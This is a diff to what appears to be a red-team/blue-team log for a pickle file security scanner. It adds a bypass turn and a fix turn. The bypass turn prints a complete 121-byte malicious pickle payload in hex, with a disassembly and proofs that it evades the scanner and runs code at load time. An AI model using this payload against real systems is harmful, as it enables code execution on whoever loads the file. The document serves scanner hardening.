@@ -20596,3 +20596,175 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3899 passed, 1022 skipped, 21 warnings in 42.72s
 ```
+
+## Turn 297 - Bypass via `string.Template` mapping lookup into `defaultdict`
+
+Offensive turn after the Turn 296 `WeakMethod` defense. This shifts back from
+weakref finalization to another finite call source: template substitution
+performs mapping lookups internally.
+
+Representative payload:
+
+```python
+mapping = collections.defaultdict(builtins.help)
+template = string.Template("$missing")
+string.Template.substitute(template, mapping)
+```
+
+`Template.substitute()` resolves `$missing` with `mapping["missing"]`. Because
+the mapping is a `defaultdict`, the missing-key lookup invokes the
+attacker-selected default factory. With `builtins.help` and a shadowable
+`pydoc`, that becomes import-time code execution during unpickling.
+
+Proof:
+
+```text
+payload_len 121
+payload_hex 80048c0b636f6c6c656374696f6e738c0b64656661756c7464696374938c086275696c74696e738c0468656c7093855294308c06737472696e678c0854656d706c617465938c08246d697373696e67855294308c06737472696e678c1354656d706c6174652e7375627374697475746593286801680074522e
+
+0: PROTO 4
+28: STACK_GLOBAL      # collections.defaultdict
+45: STACK_GLOBAL      # builtins.help factory
+47: REDUCE            # defaultdict(help)
+68: STACK_GLOBAL      # string.Template
+80: REDUCE            # Template("$missing")
+112: STACK_GLOBAL     # string.Template.substitute
+119: REDUCE           # substitute(template, mapping), calls mapping["missing"]
+120: STOP
+```
+
+Scanner proof:
+
+```text
+verdict clean findings 0 errors ()
+imports [
+  ('collections', 'defaultdict', False),
+  ('builtins', 'help', False),
+  ('string', 'Template', False),
+  ('string', 'Template.substitute', False),
+]
+invocations [
+  ('collections', 'defaultdict', 1),
+  ('string', 'Template', 1),
+  ('string', 'Template.substitute', 2),
+]
+findings []
+```
+
+Runtime proof with shadowed `pydoc`:
+
+```text
+runtime_rc 0
+runtime_result 'VALUE'
+marker_exists True
+marker_text owned-by-template-defaultdict
+```
+
+Sibling:
+
+```text
+string.Template.safe_substitute(template, mapping)
+scan clean findings 0
+runtime_result 'VALUE'
+marker_exists True
+```
+
+No-placeholder boundary:
+
+```text
+template = string.Template("plain text")
+string.Template.substitute(template, mapping)
+
+scan clean findings 0
+runtime_result 'plain text'
+marker_exists False
+```
+
+Why it bypasses:
+
+- The scanner tracks `collections.defaultdict` factories and already models
+  lookup surfaces such as `operator.getitem`, direct `defaultdict.__getitem__`,
+  `%` formatting, `str.format_map`, and `string.Formatter.vformat`.
+- `string.Template.substitute` and `string.Template.safe_substitute` are clean
+  import references and are not modeled as mapping-lookup dispatch sources.
+- The callback is hidden behind the mapping protocol inside the template
+  implementation, so the current stack model records the method call but does
+  not synthesize the zero-argument default-factory invocation.
+
+Likely source-level defense:
+
+- Track `string.Template(...)` as a small stack value containing the literal
+  template string, similar to the existing regex-pattern stack value.
+- When `Template.substitute` or `Template.safe_substitute` is called with a
+  tracked `DefaultDict`, synthesize the zero-argument default-factory call if
+  the template contains at least one placeholder that may require mapping
+  lookup.
+- A simpler fail-closed row could synthesize the factory for any
+  `Template.substitute/safe_substitute` call with a `DefaultDict` mapping, but
+  the no-placeholder boundary shows a cheap literal-template guard can reduce
+  false positives.
+
+Performance note:
+
+- The representative payload is 121 bytes.
+- Warm scan timing over 1000 scans was median `0.000071s`, p95 `0.000077s`,
+  and max `0.000931s`.
+
+## Turn 298 - Block `string.Template` lookup into `defaultdict`
+
+Defensive turn for the Turn 297 bypass. The scanner now models
+`string.Template` objects created from literal template strings and treats
+`Template.substitute` / `Template.safe_substitute` as mapping-lookup dispatch
+sources when the supplied mapping is a tracked `collections.defaultdict`.
+
+Implementation:
+
+- Added a compact `StackValue::StringTemplate` carrying the literal template.
+- Added call-graph handling for
+  `string.Template.substitute` and `string.Template.safe_substitute`.
+- Synthesizes the tracked `defaultdict` factory invocation only when the
+  template literal contains a `$` placeholder-like lookup.
+- Kept a no-placeholder boundary so `Template("plain text").substitute(dd)` does
+  not produce a spurious callback edge.
+
+Regression coverage:
+
+- Malicious positive for both `Template.substitute` and
+  `Template.safe_substitute`, using `defaultdict(builtins.help)` and a shadowed
+  `pydoc` runtime proof.
+- Benign near-match negative for both methods with a literal template that has
+  no placeholder.
+- Assertions check the synthesized zero-argument `builtins.help` invocation and
+  the reachable `_sitebuiltins._Helper.__call__ -> builtins.__import__` chain.
+
+Validation:
+
+```text
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q -k "template_defaultdict"
+4 passed, 184 deselected in 0.45s
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+188 passed in 4.97s
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+226 passed in 6.39s
+
+ruff format
+392 files left unchanged
+
+ruff check --fix
+All checks passed
+
+mypy
+Success: no issues found in 447 source files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3903 passed, 1022 skipped, 21 warnings in 38.44s
+```
+
+Performance note:
+
+- The additional literal-template scan is linear in the tracked template string
+  length and runs only for modeled `Template.substitute` /
+  `Template.safe_substitute` calls.
+- The check stops on the first placeholder-like `$` and skips escaped `$$`.
